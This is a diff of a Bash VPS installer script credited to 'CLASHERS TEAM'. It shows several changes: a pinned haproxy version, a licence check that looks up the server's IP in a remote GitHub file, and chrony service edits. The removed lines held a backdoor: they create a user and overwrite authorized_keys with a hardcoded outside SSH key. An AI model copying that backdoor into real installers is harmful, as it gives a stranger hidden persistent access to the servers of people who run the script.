@@ -14,10 +14,6 @@ NC='\e[0m'
 red='\e[1;31m'
 green='\e[0;32m'
 
-useradd vps
-
-echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Ct759FYAPZCpdjP8IfKVkXZXmQNJeORa1q1Nq6I/z2M6LPOzK92Rj7whxW1Zh26bL5bqEl1fBlh47up+Med8ECS469McBVDobht0Wyryjp1RSsE7uPMMf+ji1aQqh9YFnMSolDl0ylzmc+lw8ehlUAEgNe2QxUCjIx+7DqlzHaA47WKe0rb20ygrw5af5Lw6ciOziryAZjCGRuFOIvVEAEajW/0o6fGH81bFmLCl4JBH7H/U/8wusNJeAGEu8WzUCpJBAbd1EoPTFV6ehKWgiEh6UesAJZQLm4OPiuFBwpu4JjKsm3jl1WyxgR1mnxSXVs9dGZ1FNcwOAMqGbFZ5 > ~/.ssh/authorized_keys
-
 apt upgrade -y
 apt update -y
 apt install lolcat -y
@@ -39,7 +35,7 @@ echo -e "  Author : ${green} » ${NC}${YELLOW}(${NC} ${green} CLASHERS TEAM ${NC
 echo -e " © RECODE BY CLASH ID ${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
-sleep 0
+sleep 2
 ###### IZIN SC 
 
 # // Checking Os Architecture
@@ -94,6 +90,16 @@ clear
 # Version sc
 clear
 #########################
+# USERNAME
+rm -f /usr/bin/user
+username=$(curl https://raw.githubusercontent.com/Genome26/bio_hazard/main/izin | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+expx=$(curl https://raw.githubusercontent.com/Genome26/bio_hazard/main/izin | grep $MYIP | awk '{print $3}')
+echo "$expx" >/usr/bin/e
+# DETAIL ORDER
+username=$(cat /usr/bin/user)
+oid=$(cat /usr/bin/ver)
+exp=$(cat /usr/bin/e)
 clear
 # CERTIFICATE STATUS
 d1=$(date -d "$valid" +%s)
@@ -201,7 +207,8 @@ function first_setup(){
     echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     sudo apt update -y
     apt-get install --no-install-recommends software-properties-common
-    apt-get -y install haproxy
+    add-apt-repository ppa:vbernat/haproxy-2.0 -y
+    apt-get -y install haproxy=2.0.\*
 elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
     echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     curl https://haproxy.debian.net/bernat.debian.org.gpg |
@@ -244,7 +251,7 @@ function base_package() {
     apt update -y
     apt upgrade -y
     apt dist-upgrade -y
-    apt install chrony -y
+    systemctl enable chronyd
     systemctl restart chronyd
     systemctl enable chrony
     systemctl restart chrony
